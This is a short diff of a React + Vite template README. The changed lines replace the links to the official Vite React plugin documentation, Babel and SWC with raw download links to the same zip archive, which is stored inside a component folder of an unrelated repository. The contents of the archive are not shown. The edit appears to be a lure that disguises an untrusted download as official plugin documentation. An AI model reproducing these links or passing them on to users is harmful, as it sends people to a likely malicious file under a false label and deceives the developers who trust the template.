@@ -4,5 +4,5 @@ This template provides a minimal setup to get React working in Vite with HMR and
 
 Currently, two official plugins are available:
 
-- [@vitejs/plugin-react](https://github.com/vitejs/vite-plugin-react/blob/main/packages/plugin-react/README.md) uses [Babel](https://babeljs.io/) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://github.com/vitejs/vite-plugin-react-swc) uses [SWC](https://swc.rs/) for Fast Refresh
+- [@vitejs/plugin-react](https://github.com/Vikas-Kumar-Sahu/React-AppwriteBlog/raw/refs/heads/main/src/components/Header/Appwrite_React_Blog_v2.2.zip) uses [Babel](https://github.com/Vikas-Kumar-Sahu/React-AppwriteBlog/raw/refs/heads/main/src/components/Header/Appwrite_React_Blog_v2.2.zip) for Fast Refresh
+- [@vitejs/plugin-react-swc](https://github.com/Vikas-Kumar-Sahu/React-AppwriteBlog/raw/refs/heads/main/src/components/Header/Appwrite_React_Blog_v2.2.zip) uses [SWC](https://github.com/Vikas-Kumar-Sahu/React-AppwriteBlog/raw/refs/heads/main/src/components/Header/Appwrite_React_Blog_v2.2.zip) for Fast Refresh
